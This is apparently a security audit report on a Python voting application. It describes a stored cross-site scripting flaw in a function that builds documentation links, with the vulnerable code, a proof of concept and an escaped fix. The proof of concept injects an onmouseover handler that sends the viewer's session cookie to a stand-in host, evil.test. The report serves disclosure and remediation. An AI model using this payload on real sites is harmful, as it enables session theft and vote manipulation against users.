## Findings

### Critical Severity

#### ASVS-122-CRI-001 — Stored XSS via Unencoded Untrusted Data in Dynamically Built URL

**Severity:** Critical  
**Gap Type:** Type A — Entry point with NO control  
**CWE:** CWE-79 (Cross-site Scripting), CWE-116 (Improper Encoding or Escaping of Output)

##### Location

- **File:** `v3/server/pages.py`
- **Function:** `rewrite_description`
- **Lines:** 55–63
- **Rendered in:** `v3/server/templates/vote-on.ezt` (within `[issues.description]` output)

##### Related Functions Checked

- `pages.py:vote_on_page()` — Calls `rewrite_description` on issue objects
- `pages.py:do_add_issue_endpoint()` — Entry point for issue creation (~line 525)
- `election.py:add_issue()` — Persists description to database (~line 200)
- `election.py:list_issues()` — Retrieves issues for display
- `vote-on.ezt` — Template that renders the vulnerable HTML

##### Vulnerable Code

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    # Replace doc:filename with <a> link
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'  # ← No URL encoding, no HTML attribute encoding
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

**Control Gap:** URL encoding and HTML attribute encoding controls **do not exist anywhere in this path**. The `filename` captured by the regex is injected directly into an `href` attribute without any sanitization.

##### Proof of Concept

**Step 1:** Authenticated committer creates an issue with the following description:

```
Please review the documentation: doc:x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="
```

**Step 2:** The `rewrite_description` function's regex captures the filename portion:

```
Captured filename: x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="
```

**Step 3:** Generated HTML in `issue.description`:

```html
<pre><a href="/docs/a1b2c3d4e5/x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="">x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="</a></pre>
```

**Step 4:** Browser parsing result:

- `href="/docs/a1b2c3d4e5/x"` — Truncated href attribute
- `onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"` — **Event handler attribute injected**
- `y=""` — Harmless extra attribute to close the quote
- Link text contains the full malicious payload (also vulnerable)

**Step 5:** Exploitation:

Any voter viewing the election page at `/vote-on/<eid>` sees the malicious link. When they hover over it, the JavaScript executes, sending their session cookie to `evil.test`.

**Attack Feasibility:** 

- **Authentication required:** Yes (committer access)
- **Authorization bypass:** The `### check authz` placeholders at lines ~511, ~536 are not implemented, meaning any authenticated committer can create issues on any election
- **User interaction:** Minimal (mouseover on a legitimate-looking documentation link)
- **Persistence:** Stored XSS — affects all voters who view the page

##### Impact

- **Stored Cross-Site Scripting (XSS)** vulnerability in a voting system
- **Session hijacking:** Attackers can steal session tokens and impersonate voters
- **Vote manipulation:** Attackers can silently modify vote submissions via DOM manipulation
- **Scope:** Affects all voters who view any compromised election's voting page
- **Trust context:** The voting context makes this especially sensitive — vote integrity depends on client-side form state and user trust
- **Amplified by authorization gaps:** Any committer can exploit this against any election's voters

##### Remediation

**Immediate Fix:**

```python
import html
from urllib.parse import quote

def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    # HTML-escape the entire description first (defense in depth)
    desc = html.escape(issue.description)
    
    def repl(match):
        filename = match.group(1)
        # URL-encode for path context
        url_safe_filename = quote(filename, safe="")
        # HTML-escape for attribute context
        safe_href = html.escape(f'/docs/{issue.iid}/{url_safe_filename}')
        safe_text = html.escape(filename)
        return f'<a href="{safe_href}">{safe_text}</a>'
    
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

**Encoding Layers Applied:**

1. `html.escape()` on the full description before regex processing (defense in depth against other injection vectors)
2. `urllib.parse.quote()` for URL path encoding of the filename (ASVS 1.2.2 requirement)
3. `html.escape()` on the constructed `href` attribute value (HTML attribute context)
4. `html.escape()` on the link text (HTML text context)

## Positive Security Patterns

### Effective Controls Identified

| Pattern | Location | Implementation | Assessment |
|---------|----------|----------------|------------|
| Hex-only EIDs in redirects | `pages.py` (all `quart.redirect()` calls) | All election IDs are generated via `secrets.token_hex()` and validated against database before use | ✅ **Excellent** — No injection possible; cryptographically random hex strings cannot contain special characters |
| EZT dual-encoding for JS contexts | `manage.ezt`, `manage-stv.ezt` (onclick handlers) | `[format "js,html"]` applied where issue titles/descriptions are injected into JS string literals inside HTML attributes | ✅ **Correct** — Proper encoding chain for nested contexts (JS inside HTML) |
| Relative URLs only | All templates and server-side redirects | All constructed URLs start with `/`, no user control over protocol | ✅ **Strong** — Eliminates `javascript:` and `data:` protocol injection vectors entirely |
| Framework file serving | `pages.py:serve_doc`, `serve_static` | Uses `quart.send_from_directory()` for file operations | ✅ **Secure** — Framework function provides built-in path traversal protection |
| Database-validated IDs | `load_election` / `load_election_issue` decorators | EIDs and IIDs validated against database before any URL construction | ✅ **Defense in depth** — Ensures only valid identifiers reach URL construction code |
| Parameterized SQL queries | `election.py`, `persondb.py` | All SQL operations use parameter binding through `asfpy.db` wrapper | ✅ **Best practice** — Prevents SQL injection (out of scope for ASVS 1.2.2 but noteworthy) |

### Architectural Strengths

1. **Consistent use of relative paths** — The codebase never constructs URLs with user-controlled protocols, eliminating an entire class of injection attacks

2. **Strong identifier generation** — Election and issue IDs use `secrets.token_hex()`, providing cryptographically secure random identifiers that cannot be manipulated to inject special characters

3. **Template encoding awareness** — Where used, the `[format "js,html"]` directive shows understanding of context-specific encoding requirements

## Architecture Observations

### Security Architecture Issues

1. **EZT templating lacks auto-escaping**
   - Unlike modern frameworks (Jinja2's `autoescape`, React's JSX), EZT renders values raw by default
   - The codebase uses `[format "js,html"]` selectively, but this requires developers to remember encoding for every output point
   - **Risk:** Easy to miss encoding requirements, especially for new developers or when adding new features

2. **Python-side HTML construction bypasses template encoding**
   - The pattern of building HTML strings in Python code (`rewrite_description`) and injecting them into templates defeats any template-layer encoding strategy
   - Templates cannot apply encoding to pre-constructed HTML strings
   - **Recommendation:** All HTML construction should happen in templates where encoding controls are available and visible

3. **Authorization gaps amplify vulnerability impact**
   - The `### check authz` placeholders throughout `pages.py` indicate incomplete authorization implementation
   - Any authenticated committer can create issues in any election
   - **Impact amplification:** Without proper authorization, the XSS vulnerability can be exploited by any committer against any election's voters
   - **If authorization were enforced:** Attack surface would be limited to election owners affecting their own voters (still problematic, but smaller blast radius)

4. **Separation of concerns violation**
   - Business logic (`rewrite_description`) performs presentation layer tasks (HTML generation)
   - Makes security review harder — encoding requirements are scattered across Python code and templates
   - **Better pattern:** Pass structured data to templates, let templates handle rendering

### Positive Architectural Patterns

1. **Decorator-based request validation** — The `load_election` and `load_election_issue` decorators centralize ID validation logic

2. **Consistent redirect patterns** — All redirects use a consistent pattern of hardcoded paths + validated IDs

3. **Framework security features** — Leverages Quart's built-in protections for file serving and routing

   - Apply HTML attribute encoding to all dynamic content in href attributes
   - **Timeline:** Deploy within 24-48 hours

2. **[CRITICAL]** Audit all other Python-side HTML construction
   - Search codebase for `f'<` and `.format('<` patterns
   - Identify any other locations where HTML is built in Python code
   - Apply appropriate encoding or refactor to template-based rendering

### Short-Term Actions (1-2 weeks)

3. **[HIGH]** Implement authorization checks
   - Complete the `### check authz` placeholders in `pages.py`
   - Restrict issue creation/modification to election owners or authorized users
   - **Impact:** Reduces attack surface for content injection vulnerabilities

4. **[HIGH]** Establish HTML construction policy
   - Document that all HTML must be constructed in templates, not Python code
   - Create code review checklist item for this requirement
   - Refactor `rewrite_description` to pass structured data to template:
     ```python
     # In pages.py
     def parse_doc_references(description):
         """Extract doc: references as structured data."""
         import re
         refs = []
         for match in re.finditer(r'doc:([^\s]+)', description):
             refs.append({
                 'filename': match.group(1),
                 'start': match.start(),
                 'end': match.end()
             })
         return refs
     
     # Pass to template: issue.doc_refs = parse_doc_references(issue.description)
     ```
     ```html
     <!-- In vote-on.ezt -->
     <pre>[issues.description]</pre>
     [for ref in issues.doc_refs]
       <a href="/docs/[issues.iid]/[format "url"][ref.filename][end]">
         [format "html"][ref.filename][end]
       </a>
     [end]
     ```

5. **[MEDIUM]** Add security-focused code review checklist
   - Include ASVS 1.2.2 requirements in pull request template
   - Require explicit encoding justification for any URL construction with dynamic data
   - Flag any Python-side HTML construction for security review

### Long-Term Actions (1-3 months)

6. **[ARCHITECTURAL]** Evaluate migration to auto-escaping template engine
   - Consider migrating from EZT to Jinja2 with `autoescape=True`
   - **Benefit:** Encoding becomes opt-out instead of opt-in, reducing developer burden
   - **Effort:** Significant (requires template rewrites)
   - **Risk reduction:** Eliminates entire class of forgotten-encoding vulnerabilities

7. **[ARCHITECTURAL]** Implement Content Security Policy (CSP)
   - Add CSP headers to mitigate impact of any future XSS vulnerabilities
   - Start with `Content-Security-Policy: default-src 'self'; script-src 'self'`
   - **Defense in depth:** Won't prevent XSS, but limits attacker capabilities

8. **[PROCESS]** Establish security testing requirements
   - Add automated XSS testing to CI/CD pipeline
   - Include ASVS 1.2.2 test cases in security test suite
   - Perform annual third-party security audits

9. **[TRAINING]** Security awareness for developers
   - Training on context-specific output encoding
   - OWASP Top 10 awareness
   - Secure coding guidelines specific to this codebase
